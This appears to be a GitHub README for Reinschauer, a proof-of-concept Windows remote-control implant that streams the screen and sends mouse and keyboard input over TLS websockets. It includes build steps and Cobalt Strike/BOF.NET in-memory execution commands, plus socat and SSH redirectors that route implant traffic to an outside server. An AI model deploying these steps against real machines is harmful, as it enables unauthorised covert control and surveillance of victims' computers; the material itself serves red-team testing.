# Reinschauer

![Hello](https://github.com/ps1337/reinschauer/blob/main/server/reinschauer.jpg?raw=true)

A PoC to remotely control Windows machines over Websockets.

![Hello](https://github.com/ps1337/reinschauer/blob/main/res/reinschauer.gif?raw=true)

- Can be executed as Go exe, .NET/C# exe and in-memory using [BOF.NET](https://github.com/CCob/BOF.NET) and Cobaltstrike.

![Hello](https://github.com/ps1337/reinschauer/blob/main/res/reinschauer_start.png?raw=true)

- Traffic can be tunneled via an interactive Beacon connection.
- Other than most HVNC implementations, `reinschauer` converts raw bitmaps to JPEG and compresses the resulting data before sending it across the network to reduce frame size.
- FPS and quality settings can be dynamically changed via the GUI. These affect the implant, so that network traffic is reduced. Dynamic scaling allows using this tool as an implant for machines with large screens.

![Hello](https://github.com/ps1337/reinschauer/blob/main/res/goodquality.gif?raw=true)

- Basic mouse and keyboard controls are possible.
- You can use the script in the `server` folder to generate TLS server files or bring your own.
- The server window can be resized freely, while click events should™ be translated to the correct pixel on the target machine.
- Use `reinschauer-server -h` for available options.

## Protocol

```
+----------------------------------------------------------------------------------------+
|                                                                                        |
|                                                                                        |
|                  +----------------------------------------------------+                |
|                  |#1: Type (Binary or Text)                           |                |
|                  |    Binary: JPG Frame                               |                |
|                  |                                                    |                |
|                  |#2: Text                                            |                |
|                  |    ELO (Ping)                                      |                |
|                  |    FPS <FPS Count>                                 |                |
|                  |    SCL <Scaler Count>                              |                |
|                  |    QUL <JPG Quality>                               |                |
|                  |    LCL X Y (Left Click + Coordinates)              |                |
|                  |    RCL X Y                                         |                |
|                  |    KEY <Char>                                      |      xxxxxx    |
|       xxxxx   <--+----------------------------------------------------+--> xxxx   xx   |
|       x   xx                     Websockets via TLS                        xx       x  |
| x     xxxxxx                                                                xxxxxxxxx  |
| xxx     x   xx                                                          xx    x        |
|     xxxxxxxx                                                              xxxxx xxxxxx |
|         x                                                                   xxxxx      |
|         xx                                                                   xx        |
|         x xx                                                                 xxx       |
|        xx  xx                                                                x xx      |
|        x    xx                                                              xx  xxx    |
|       x      xx                                                             x     xx   |
|       x       x                                                            xx      x   |
+----------------------------------------------------------------------------------------+
```

## FAQ

**How to build?**

- Install a new version of golang, `>=1.18`
- For debian-based distros: `sudo apt -y install libx11-dev libxcursor-dev xorg-dev libgl1-mesa-dev`

```bash
$ cd client && GOOS=windows GOARCH=amd64 go build
$ cd server && GOOS=linux GOARCH=amd64 go build
```

I've included a pre-built and standalone version of the dotnet variant in this repo. If you want to build it yourself, use the Visual Studio project file to build the x64 Release variant. If it doesn't happen automatically, download the required NuGet packages for the project via Visual Studio. Your target system most likely doesn't have these packages installed as well and therefore DLLs may be missing when executing the resulting exe on the target. To get around this, this project automatically invokes `ILMerge.exe` to bundle the resulting exe along with the required libraries. Therefore, use the generated file called `reinschauer-dotnet-standalone.exe` on targets.

> You may have to `go get` stuff before. Use `-ldflags -H=windowsgui` to disable to console window.

**Who's the client/server?**

> The `client` is executed on the target (Windows) machine. The `server` component is executed on the tester's (Linux) machine. It listens on `0.0.0.0:6969` by default. Both the Golang and C# client are compatible with the server.

**Is this a HVNC / Hidden Desktop?**

> No. It uses the same Desktop as the user.

**Some keys and key combinations do not work, pls fix**

> I know that |, @ and § might not work currently, at least on my german potato keyboard. Pls Fix.

**The Client uses too much CPU Time**

> Using a lower FPS value may work.

**I don't have a direct connection between `client` and `server`**

> You can use the Cobaltstrike CNA script, which tunnels traffic via Beacon.

**I don't have Cobaltstrike!**

> Use a `socat` redirector like:

```bash
socat TCP4-LISTEN:1337,fork TCP4:127.0.0.1:6969
ssh -R 6969:localhost6969 <IP>
```

> and start the client with the required parameters or hardcode them.

## Notes Regarding BOF.NET and Cobaltstrike Usage

First, set up [BOF.NET](https://github.com/CCob/BOF.NET) according to the manual. Also, load the standalone exe with `bofnet_load <Path to Exe>`. Then, decide how to use Reinschauer:

1. You can tunnel the traffic across an active Beacon connection.
2. You can send traffic to any other Internet-facing server

### Tunnelling Traffic via Beacon

- Set the session to interactive: `sleep 0`.
- Set up remote port forwarding: `rportfwd_local 6969 127.0.0.1 6969`.
- Execute Reinschauer in background: `bofnet_job reinschauer_dotnet.BofStuff`. This automatically causes Reinschauer to connect to `127.0.0.1:6969` on `127.0.0.1` of the target machine. This also deactivates TLS, since it uses the Beacon connection anyway.
- To kill Reinschauer, use `bofnet_jobkill <Job ID>`.

*Important note regarding remote port forwarding:* It seems that the `rportfwd_local` causes Beacon to listen on `0.0.0.0` and there seems to be no way to set it to `127.0.0.1` :/ This may trigger a Windows Firewall prompt on the system and that's not cool. If you don't want this, use another remote port forwarding solution for Cobaltstrike or use the following approach.

### Sending Traffic to Another Server

- Execute Reinschauer in background: `bofnet_job reinschauer_dotnet.BofStuff <Server IP> <Server Port> true`. The boolean parameter enables TLS usage.
- To kill Reinschauer, use `bofnet_jobkill <Job ID>`.


Then, use SSH and the [GatewayPorts](https://man.openbsd.org/sshd_config#GatewayPorts) feature: Add `GatewayPorts: clientspecified` to `sshd_config` and restart the SSH server. Then, `ssh -R '0.0.0.0:8080:localhost:6969'' [...]` will make your local port `6969` available on `0.0.0.0:8080`. Be careful :)

Or, set up a `socat` redirector on the Server:

```bash
socat TCP4-LISTEN:<Server Port>,fork TCP4:127.0.0.1:6969
ssh -R 6969:localhost6969 <IP>
```
